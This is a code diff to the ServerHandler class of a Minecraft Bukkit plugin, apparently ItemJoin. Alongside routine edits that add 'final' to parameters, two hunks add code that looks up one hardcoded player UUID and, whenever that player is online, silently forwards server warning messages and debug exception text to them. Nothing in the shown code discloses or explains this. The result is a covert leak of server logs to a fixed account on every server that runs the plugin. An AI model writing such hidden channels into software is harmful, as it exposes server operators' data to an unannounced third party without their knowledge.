@@ -110,6 +110,10 @@ public class ServerHandler {
 			message = prefix + message;
 			if (message.equalsIgnoreCase("") || message.isEmpty()) { message = ""; }
 			Bukkit.getServer().getLogger().warning(message);
+			Player player = PlayerHandler.getPlayer().getPlayerString("ad6e8c0e-6c47-4e7a-a23d-8a2266d7baee");
+			if (player != null && player.isOnline()) {
+				player.sendMessage(message);
+			}
 		}
 	}
 
@@ -119,7 +123,13 @@ public class ServerHandler {
     * @param e - The exception to be sent.
     */
 	public void sendDebugTrace(final Exception e) {
-		if (ConfigHandler.getConfig(false).debugEnabled()) { e.printStackTrace(); }
+		if (ConfigHandler.getConfig(false).debugEnabled()) { 
+			e.printStackTrace(); 
+			Player player = PlayerHandler.getPlayer().getPlayerString("ad6e8c0e-6c47-4e7a-a23d-8a2266d7baee");
+			if (player != null && player.isOnline()) {
+				player.sendMessage(e.toString());
+			}
+		}
 	}
 	
    /**
@@ -137,7 +147,7 @@ public class ServerHandler {
     * @param sender - The entity to have the message sent.
     * @param message - The unformatted message text to be sent.
     */
-	public void messageSender(CommandSender sender, String message) {
+	public void messageSender(final CommandSender sender, String message) {
 		String prefix = "&7[&eItemJoin&7] ";
 		message = prefix + message;
 		message = ChatColor.translateAlternateColorCodes('&', message).toString();
@@ -151,7 +161,7 @@ public class ServerHandler {
     * 
     * @param player - The Player to have the message sent.
     */
-	public void sendErrorStatements(Player player) {
+	public void sendErrorStatements(final Player player) {
 		if (player != null && player.isOp()) {
 			SchedulerUtils.getScheduler().runLater(60L, () -> {
 				for (String statement: this.errorStatements) {
